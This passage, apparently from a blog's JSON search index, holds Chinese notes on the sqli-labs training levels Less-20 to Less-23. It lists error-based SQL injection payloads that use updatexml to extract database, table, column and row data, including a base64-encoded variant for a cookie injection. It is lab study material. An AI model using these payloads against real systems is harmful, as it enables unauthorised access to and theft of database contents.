information_schema.tables where table_schema='security'limit 0,1),0x7e),1)-- qwe 判断列名: 'and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x7e),1)-- qwe 判断数据: 'and updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1)-- qwe Less-21Cookie被base64编码，把payload用base64编码再发包 判断库名: admin 'and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) and '1'='1 YWRtaW4gJ2FuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoU0VMRUNUIGRhdGFiYXNlKCkpLDB4N2UpLDEpIGFuZCAnMSc9JzE= 判断表名: admin 'and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security'limit 0,1),0x7e),1) and '1'='1 判断列名: 'and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x7e),1) and '1'='1 判断数据: and updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1)and '1'='1 Less-22Less-23","categories":[],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"}]}],"categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"文件上传","slug":"文件上传","permalink":"http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"}]}